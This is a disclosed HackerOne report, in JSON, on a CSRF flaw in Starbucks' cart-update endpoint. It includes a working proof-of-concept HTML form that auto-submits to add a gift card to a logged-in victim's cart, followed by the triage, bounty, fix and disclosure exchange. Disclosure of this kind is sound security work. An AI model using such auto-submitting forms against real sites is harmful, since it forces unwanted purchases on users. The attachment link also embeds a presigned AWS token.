{"id":177472,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNzc0NzI=","url":"https://hackerone.com/reports/177472","title":"CSRF: add item to victim's cart automatically (starbucks.com - updatecart)","state":"Closed","substate":"resolved","severity_rating":"medium","readable_substate":"Resolved","created_at":"2016-10-22T02:18:59.203Z","submitted_at":"2016-10-22T02:18:59.203Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"bughunterboy","url":"/bughunterboy","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/078/089/cf2d9ccc8e17928108969cbc19cd4bd629821065_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":1989,"url":"https://hackerone.com/starbucks","handle":"starbucks","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/001/989/c9aa38cf3b1a91daa085d31e23d23f34cd1874df_original./43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/001/989/c9aa38cf3b1a91daa085d31e23d23f34cd1874df_original./fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Starbucks","twitter_handle":"Starbucks","website":"http://www.starbucks.com","about":"Inspiring and nurturing the human spirit -- one person, one cup, one neighborhood at a time."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2017-06-02T16:30:07.653Z","bug_reporter_agreed_on_going_public_at":"2017-06-02T16:17:20.580Z","team_member_agreed_on_going_public_at":"2017-06-02T16:30:07.595Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"\nSteps:\n    1. Victim login their starbucks account first.\n    2. Attacker send a form/link to victim.\n    3. If victim click the form/link, An item would automatically add to victim's cart.\n    4. If victim do not find this item, he/she would pay for this item which can greatly influence your repuation.\n\nAttached is the form.\n\n\n\u003chtml\u003e\n  \u003cbody\u003e\n    \u003cform action=\"https://www.starbucks.com/shop/updatecart\" method=\"POST\"\u003e\n      \u003cinput type=\"hidden\" name=\"card\u0026#95;custom\u0026#95;image\u0026#95;id\" value=\"\" /\u003e\n      \u003cinput type=\"hidden\" name=\"card\u0026#95;custom\u0026#95;theme\" value=\"\" /\u003e\n      \u003cinput type=\"hidden\" name=\"card\u0026#95;id\" value=\"db126c2c\u0026#45;277c\u0026#45;4208\u0026#45;9ade\u0026#45;e3014ba16722\" /\u003e\n      \u003cinput type=\"hidden\" name=\"card\u0026#95;quantity\" value=\"1\" /\u003e\n      \u003cinput type=\"hidden\" name=\"defined\u0026#95;amount\" value=\"25\" /\u003e\n      \u003cinput type=\"hidden\" name=\"defined\u0026#95;currency\" value=\"USD\" /\u003e\n      \u003cinput type=\"hidden\" name=\"greeting\u0026#95;card\" value=\"8779a801\u0026#45;11e4\u0026#45;463e\u0026#45;bcbd\u0026#45;8e8f7b4608ac\" /\u003e\n      \u003cinput type=\"submit\" value=\"Submit request\" /\u003e\n    \u003c/form\u003e\n    \u003cscript\u003e\n      document.forms[0].submit();\n    \u003c/script\u003e\n  \u003c/body\u003e\n\u003c/html\u003e\n\nSolution:\n    Add a CSRF-token to the post form.","bounty_amount":"250.0","formatted_bounty":"$250","weakness":{"id":45,"name":"Cross-Site Request Forgery (CSRF)"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":129556,"file_name":"starbuckcsrf.html","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/129/556/b792b83ce652d137ba1479e172d054424392067a/starbuckcsrf.html?response-content-disposition=attachment%3B%20filename%3D%22starbuckcsrf.html%22%3B%20filename%2A%3DUTF-8%27%27starbuckcsrf.html\u0026response-content-type=application%2Foctet-stream\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQTTPJWCNM%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T135327Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHUaCXVzLXdlc3QtMiJIMEYCIQDOwM9%2B2Ol25EbTHv2AOl1ZXwoFCdY81Kf4Cj%2BZw5bGagIhALNw4OtUKzuuJ5JDnXIMoizsmzLoA6B3TMlT4JOm5OV%2FKoMECO7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAhoMMDEzNjE5Mjc0ODQ5IgxBja9Y5H4vqpYK%2BZIq1wMKEFztYF934tg2oiDnz06aS%2BIxaoyblb3k6%2F%2BxBMgQzBtDrU0ocKh0rsBsPTyultSX957Ztb0Xxm%2BlSHqRsjq6d7mkuWsgkJaqQC34P%2FPoowX%2BlH2ZrTK%2FmkJH0GzYvbYPapiuIgj7k6s%2BThAEuj5K1dIvpyoPZSWU4lDCKAHDR63JJK4rjQBzSsyouhVced%2BThWTOJVdRFvPpVLh85ANN2kni9b%2BvA%2BYr4QNdI7bXX3vCy%2Bmlxmt9OtrkNSzeMBq%2B4UjjQL%2BALBrQRVk2zZ5rDj%2ByazHJ4N56LN4FxJEAdf%2BKr7nn9dZ2DExdIbY7%2Blz79tlyq02tT%2B98LGY82aPEMuTJbBZN6Znugvuj3qTN5Ajkz33XEdb09pTvqYEHwNQvHa8molgvM8Hr0UftpVOr%2FcSDQ%2Be7ClWky3g9k3C7fx8DtVeV3YKXMiauv6oe6iv529tf7ZQLwVbk8MDZHKluj8DVRfRr7MlmTLozZouf9SJ7q02NxX1M1zjSiK9%2Bb3knUL5CRpQRCENhmDWhXpTY5NtCVb6swQ3By1ka7LxXtkUadmYfSCwXxpca0jIGluHz9THdy%2Fc3993usF1hP11r0y8u18g%2BZLF5OCf8pMK8LDv4nKUjODow6e2QiwY6pAHH%2FNyAbORzwpluWJFiLzeFhl5RjYZpJEx0nM7ZKbFuGASfNSFcAHpRW7ZXX%2BBSHdPdxqv%2BQd1FC1QHUbL0ZWNROontBy0xjQujOuLkMDUyDfIqsPUVcZohJWSYUkM5yYj9wg6BrbGLNW9NinBFdcPB5%2BIeF%2Bg7o5tKzk0UaPV%2FO3FiQPt3VlESRyrk8YbEQk7JEub211414ZV4sdV3jLFmf60bgw%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=c20fe91a132f468386802ae5096ee481b19e157b573ca7b8d93a66b18fc8b725","file_size":832,"type":"text/html"}],"allow_singular_disclosure_at":"2017-07-02T16:17:20.657Z","allow_singular_disclosure_after":-134948166.3962514,"singular_disclosure_allowed":true,"vote_count":10,"voters":["eveeez","bughunterboy","japz","wragg-s","spetr0x","sahore","dynamo214_","54v174r","razahasnain979","m0n573r"],"severity":{"rating":"medium","author_type":"Team"},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":1265373,"is_internal":false,"editable":false,"type":"Activities::ReportTitleUpdated","message":"","automated_response":false,"created_at":"2016-10-24T21:11:25.330Z","updated_at":"2016-10-24T21:11:25.330Z","additional_data":{"old_title":"CSRF: add item to victim's cart automatically","new_title":"CSRF: add item to victim's cart automatically (starbucks.com - updatecart)"},"actor":{"username":"sharpie","cleared":false,"url":"/sharpie","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/093/272/b7429121474103e01ac6fabf477ddb52ed91556d_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1265380,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","automated_response":false,"created_at":"2016-10-24T21:12:00.485Z","updated_at":"2016-10-24T21:12:00.485Z","additional_data":{"old_severity":"High","new_severity":"Medium","old_severity_id":3636,"new_severity_id":3988},"actor":{"username":"sharpie","cleared":false,"url":"/sharpie","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/093/272/b7429121474103e01ac6fabf477ddb52ed91556d_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1265385,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey @bughunterboy \n\nThank you for your submission, we are currently investigating this issue. We'll notify you once we have an update. \n\nThanks! ","automated_response":false,"created_at":"2016-10-24T21:12:38.142Z","updated_at":"2016-10-24T21:12:38.142Z","actor":{"username":"sharpie","cleared":false,"url":"/sharpie","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/093/272/b7429121474103e01ac6fabf477ddb52ed91556d_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1265624,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Hey @bughunterboy \n\nNice find! We are investigating this further and we'll notify you once we have an update! ","automated_response":false,"created_at":"2016-10-24T23:15:24.118Z","updated_at":"2016-10-24T23:15:24.118Z","actor":{"username":"sharpie","cleared":false,"url":"/sharpie","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/093/272/b7429121474103e01ac6fabf477ddb52ed91556d_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1299704,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Seems like this one still remain unfixed.","automated_response":false,"created_at":"2016-11-15T02:36:12.484Z","updated_at":"2016-11-15T02:36:12.484Z","actor":{"username":"bughunterboy","cleared":false,"url":"/bughunterboy","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/078/089/cf2d9ccc8e17928108969cbc19cd4bd629821065_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1301226,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Hey @bughunterboy\n\nI'm glad you reached out about this one.\nWe typically try to award bounty at triage, or shortly after. I see that we missed it on this report - sorry about that!\n\nAs you said, this one has not been fixed yet but we'll be in touch as soon as it's time to re-test.\n\nThanks!","automated_response":false,"created_at":"2016-11-15T22:13:06.594Z","updated_at":"2016-11-15T22:13:06.594Z","actor":{"url":"/starbucks","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/001/989/c9aa38cf3b1a91daa085d31e23d23f34cd1874df_original./fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Starbucks"}},"bounty_amount":"250.0","bounty_currency":"usd","genius_execution_id":null,"team_handle":"starbucks","collaborator":{"username":"bughunterboy","url":"/bughunterboy"},"actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1301649,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi\nI am really appreciate that. I am wondering if your subdomain like ***.starbucks.com is in scope? If yes, I would help to test these websites. Thank you again.","automated_response":false,"created_at":"2016-11-16T02:40:12.340Z","updated_at":"2016-11-16T02:40:12.340Z","actor":{"username":"bughunterboy","cleared":false,"url":"/bughunterboy","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/078/089/cf2d9ccc8e17928108969cbc19cd4bd629821065_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1303652,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey @bughunterboy \n\nAs stated in our policies [here](http://hackerone.com/stargbucks), `Subdomains not specifically listed are not included in the Targets Eligible for Reward.`. \n\nThanks!","automated_response":false,"created_at":"2016-11-17T06:02:57.390Z","updated_at":"2016-11-17T06:02:57.390Z","actor":{"username":"sharpie","cleared":false,"url":"/sharpie","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/093/272/b7429121474103e01ac6fabf477ddb52ed91556d_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1493556,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Should we close this report as resolved?","automated_response":false,"created_at":"2017-02-19T08:11:12.125Z","updated_at":"2017-02-19T08:11:12.125Z","actor":{"username":"bughunterboy","cleared":false,"url":"/bughunterboy","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/078/089/cf2d9ccc8e17928108969cbc19cd4bd629821065_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1708762,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"This one is fixed now. Pls close ot as resolved thanks.","automated_response":false,"created_at":"2017-05-30T08:12:45.494Z","updated_at":"2017-05-30T08:12:45.494Z","actor":{"username":"bughunterboy","cleared":false,"url":"/bughunterboy","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/078/089/cf2d9ccc8e17928108969cbc19cd4bd629821065_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1716741,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @bughunterboy, \n\nThank you for your patience. We having been testing this issue and have found that this bug is still reproducing on our end. We are working towards getting it resolved and will be in touch as soon as we have an update!\n\nBest Regards, \n@overice ","automated_response":false,"created_at":"2017-05-31T16:43:03.236Z","updated_at":"2017-05-31T16:43:03.236Z","actor":{"username":"overice","cleared":false,"url":"/overice","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/161/018/993b2d44b7dea7bd979efa3030b9456f04690408_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1716752,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Oh. Thanks for that．I find I cannot in your system now. No wonder it failed.\n\nCan you give me a test account so I can help to test more?","automated_response":false,"created_at":"2017-05-31T16:45:27.753Z","updated_at":"2017-05-31T16:45:27.753Z","actor":{"username":"bughunterboy","cleared":false,"url":"/bughunterboy","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/078/089/cf2d9ccc8e17928108969cbc19cd4bd629821065_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1725596,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Hi @bughunterboy, \n\nThank you for your patience. A fix has been deployed and this bug has now been resolved. We look forward to working with you on future reports! \n\nBest Regards, \n@overice ","automated_response":false,"created_at":"2017-06-02T16:14:46.451Z","updated_at":"2017-06-02T16:14:46.451Z","actor":{"username":"overice","cleared":false,"url":"/overice","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/161/018/993b2d44b7dea7bd979efa3030b9456f04690408_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"bughunterboy","url":"/bughunterboy"},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1725605,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Mind public disclosure?\n","automated_response":false,"created_at":"2017-06-02T16:17:20.604Z","updated_at":"2017-06-02T16:17:20.604Z","first_to_agree":true,"actor":{"username":"bughunterboy","cleared":false,"url":"/bughunterboy","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/078/089/cf2d9ccc8e17928108969cbc19cd4bd629821065_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1725625,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2017-06-02T16:30:07.617Z","updated_at":"2017-06-02T16:30:07.617Z","actor":{"username":"overice","cleared":false,"url":"/overice","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/161/018/993b2d44b7dea7bd979efa3030b9456f04690408_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1725626,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2017-06-02T16:30:07.671Z","updated_at":"2017-06-02T16:30:07.671Z","actor":{"username":"overice","cleared":false,"url":"/overice","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/161/018/993b2d44b7dea7bd979efa3030b9456f04690408_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}